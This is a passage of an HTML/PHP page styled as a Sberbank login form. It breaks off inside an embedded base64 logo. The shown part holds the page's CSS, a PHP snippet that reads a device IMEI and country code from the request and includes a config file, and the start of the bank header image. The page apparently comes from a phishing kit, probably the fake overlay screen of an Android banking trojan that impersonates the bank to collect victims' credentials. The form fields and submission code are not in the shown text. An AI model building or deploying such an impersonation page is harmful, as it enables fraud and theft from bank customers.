<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sberbank</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background: #e4e4e2;
        }

        label {
            float: left;
            margin: 15px 10px 10px 7px;
            font-weight: bold;
        }

        #header {
            background: #fff;
        }

        #line {
            background: #098C2A;
            height: 2px;
        }

		#message {
			background: #17D017;
			text-shadow: 0px 0px 9px #b3b3b3;
			padding: 7px;
			color: #fff;
			font-weight: bold;
			border-radius: 6px 6px 0 0;
		}

        .form {
            background: #fff;
            color: #000;
            border-radius: 0 0 6px 6px;
            height: 180px;
        }

        .input-field {
            float: right;
            width: 67%;
            margin-top: 10px;
            background: #e4e4e2;
            border-radius: 6px;
            border: 1px solid #17D017;
            padding: 10px;
            margin-right: 10px;
            outline: none;
        }

        .submit-button {
            background: #484848;
            width: 100%;
            padding: 10px;
            color: #fff;
            border: 0 none;
            border-radius: 6px;
        }

        .fielderror {
            float: right;
            width: 67%;
            margin-top: 10px;
            background: #e4e4e2;
            border-radius: 6px;
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #F00;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

    <div id="content_div">
        <div id="header">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXMAAABvCAIAAACRu7eRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2lpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDIxIDc5LjE1NDkxMSwgMjAxMy8xMC8yOS0xMTo0NzoxNiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo5Njg4MmU5OC0zOTBlLTBlNDAtYjNkMi0wMWJkYjNiY2U3N2IiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6REU3NDNFRTgwMkE1MTFFNUEyMTRCMkI3QThEMEZDMjYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6REU3NDNFRTcwMkE1MTFFNUEyMTRCMkI3QThEMEZDMjYiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjQzNjMzN0IwRTFDMTExRTRBNTJDOERENEZDMkIxOTNGIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjQzNjMzN0IxRTFDMTExRTRBNTJDOERENEZDMkIxOTNGIi8+IDwvcmRmOkRlc2Ny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